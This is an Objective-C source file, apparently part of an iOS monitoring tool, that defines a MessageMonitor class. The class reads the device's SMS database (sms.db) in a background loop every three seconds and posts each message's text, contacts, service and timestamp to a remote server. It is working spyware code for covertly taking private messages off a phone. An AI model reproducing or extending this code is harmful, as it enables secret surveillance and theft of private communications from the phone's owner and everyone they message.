#import "include/monitor.h"
#import <sqlite3.h>

@implementation MessageMonitor

- (void)start {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        [self pollMessages];
    });
    NSLog(@"[iOSMonitor] MessageMonitor started");
}

- (void)pollMessages {
    NSString *dbPath = @"/var/mobile/Library/SMS/sms.db";
    sqlite3 *db = NULL;
    int rc = sqlite3_open([dbPath UTF8String], &db);
    if (rc != SQLITE_OK) {
        NSLog(@"[iOSMonitor] Failed to open SMS db: %d", rc);
        return;
    }

    NSInteger lastID = 0;
    while (YES) {
        NSString *query = [NSString stringWithFormat:
            @"SELECT m.ROWID, m.text, m.is_from_me, m.service, m.date, "
            @"IFNULL(h.id, 'Unknown') AS address "
            @"FROM message m "
            @"LEFT JOIN handle h ON m.handle_id = h.ROWID "
            @"WHERE m.ROWID > %ld "
            @"ORDER BY m.ROWID ASC LIMIT 50", (long)lastID];

        sqlite3_stmt *stmt = NULL;
        if (sqlite3_prepare_v2(db, [query UTF8String], -1, &stmt, NULL) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                lastID = sqlite3_column_int64(stmt, 0);
                NSString *text = [NSString stringWithUTF8String:(const char *)sqlite3_column_text(stmt, 1)] ?: @"";
                int isFromMe = sqlite3_column_int(stmt, 2);
                NSString *service = [NSString stringWithUTF8String:(const char *)sqlite3_column_text(stmt, 3)] ?: @"SMS";
                NSTimeInterval dateRef = sqlite3_column_double(stmt, 4);
                NSDate *date = [NSDate dateWithTimeIntervalSinceReferenceDate:dateRef];
                NSString *contact = [NSString stringWithUTF8String:(const char *)sqlite3_column_text(stmt, 5)] ?: @"Unknown";

                NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
                fmt.dateFormat = @"yyyy-MM-dd HH:mm:ss";
                NSString *ts = [fmt stringFromDate:date];

                [[HTTPClient sharedClient] post:@"message" params:@{
                    @"text": text,
                    @"sender": isFromMe ? @"Me" : contact,
                    @"recipient": isFromMe ? contact : @"Me",
                    @"is_from_me": @(isFromMe),
                    @"service": service,
                    @"timestamp": ts
                }];
            }
            sqlite3_finalize(stmt);
        }
        [NSThread sleepForTimeInterval:3.0];
    }

    sqlite3_close(db);
}

@end
